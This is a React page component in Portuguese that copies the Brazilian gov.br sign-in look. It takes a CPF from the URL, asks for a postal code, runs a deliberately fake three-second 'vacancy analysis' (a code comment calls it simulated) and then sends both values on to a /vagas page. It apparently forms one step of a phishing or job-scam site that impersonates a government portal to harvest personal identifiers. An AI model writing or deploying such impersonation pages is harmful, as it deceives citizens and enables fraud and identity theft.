import { useState, useEffect } from "react";
import { useLocation } from "wouter";

export default function ValidacaoCep() {
  const [, setLocation] = useLocation();
  const [cep, setCep] = useState("");
  const [cpf, setCpf] = useState("");
  const [loadingCep, setLoadingCep] = useState(false);
  const [validationError, setValidationError] = useState("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const cpfParam = params.get("cpf");
    if (cpfParam) {
      setCpf(cpfParam);
    }
  }, []);

  const formatCEP = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length <= 8) {
      return cleaned.replace(/(\d{5})(\d)/, "$1-$2");
    }
    return cleaned.substring(0, 8).replace(/(\d{5})(\d)/, "$1-$2");
  };

  const handleCEPSubmit = async () => {
    if (cep.replace(/\D/g, "").length !== 8) {
      setValidationError("Por favor, informe um CEP válido.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }

    setLoadingCep(true);
    setValidationError("");

    try {
      const response = await fetch(
        `https://viacep.com.br/ws/${cep.replace(/\D/g, "")}/json/`
      );
      const data = await response.json();

      if (data.erro) {
        setValidationError("CEP não encontrado.");
        setLoadingCep(false);
        return;
      }

      // Simula análise de 3 segundos
      setTimeout(() => {
        setLocation(`/vagas?cep=${cep.replace(/\D/g, "")}&cpf=${cpf}`);
      }, 3000);
    } catch (error) {
      setValidationError("Erro ao buscar CEP. Tente novamente.");
      setLoadingCep(false);
    }
  };

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <h3 style={{ color: "#008C32" }}>✓ Dados Validados</h3>
            <p>
              Agora precisamos do seu CEP para verificar a disponibilidade de
              vagas na sua região.
            </p>

            <div className="accordion-panel">
              <label htmlFor="cep">CEP</label>
              <input
                type="text"
                id="cep"
                placeholder="00000-000"
                value={cep}
                onChange={(e) => setCep(formatCEP(e.target.value))}
                maxLength={9}
                disabled={loadingCep}
              />

              {validationError && (
                <p style={{ color: "#ff0000", marginTop: "10px" }}>
                  {validationError}
                </p>
              )}

              {loadingCep && (
                <p style={{ color: "#008C32", marginTop: "10px" }}>
                  Analisando disponibilidade de vagas na sua região...
                </p>
              )}

              <div className="button-panel">
                <button
                  className="button-continuar"
                  onClick={handleCEPSubmit}
                  disabled={loadingCep}
                >
                  {loadingCep ? "Analisando..." : "Verificar Vagas"}
                </button>
              </div>
            </div>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
